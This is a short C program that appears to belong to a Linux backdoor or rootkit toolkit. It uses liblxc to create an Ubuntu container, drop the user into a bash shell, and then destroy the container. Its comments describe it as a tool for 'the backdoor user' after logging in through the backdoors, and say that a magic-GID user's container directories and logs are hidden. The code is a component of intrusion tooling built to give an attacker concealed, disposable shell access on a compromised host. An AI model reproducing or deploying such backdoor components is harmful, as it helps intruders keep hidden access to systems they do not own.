// This little program allows you to dynamically create, start, enter, stop & destroy LXC containers using liblxc.
// It is utilised by the backdoor user once logged in to either backdoors.
// When this is used with the MAGIC_GID set user, all log files and container directories are hidden.
// Container directory is usually located in /var/lib/lxc, and log files in /var/log/lxc.
// Remember to link liblxc when compiling with gcc.
// Usage: ./enter_lxc [container_name]

#include <stdio.h>
#include <unistd.h>

#include <lxc/lxccontainer.h>

int main(int argc, char *argv[])
{
    // if we're not root, we can't create the container.. BAIL
    // if no container name is given.. BAIL
    if(getuid() != 0 || argc == 1) return 1;

    struct lxc_container *c;
    if(!(c = lxc_container_new(argv[1], NULL)) || c->is_defined(c)) { lxc_container_put(c); return 1; }

    printf("[+] creating container %s, please wait...\n", argv[1]);
    // so we need to download the container filesystem to emulate an ubuntu system.. this can take a while in some cases
    // program will terminate if debootstrap isn't found
    if(!c->createl(c, "download", NULL, NULL, LXC_CREATE_QUIET, "-d", "ubuntu", "-r", "trusty", "-a", "i386", NULL) || !c->start(c, 0, NULL)) { lxc_container_put(c); return 1; }
    printf("[+] container created...\n");

    printf("[+] entering container...\n");
    if(c->attach_run_wait(c, NULL, "/bin/bash", NULL) == -1) { lxc_container_put(c); return 1; }

    // once the attach_run_wait function returns a value, we can completely destroy the container
    printf("[+] destroying container...\n");
    if(!c->shutdown(c, 30)) { if(!c->stop(c)) { lxc_container_put(c); return 1; } }
    if(!c->destroy(c)) { lxc_container_put(c); return 1; }
    printf("[+] container destroyed\n");

    lxc_container_put(c);
    return 0;
}
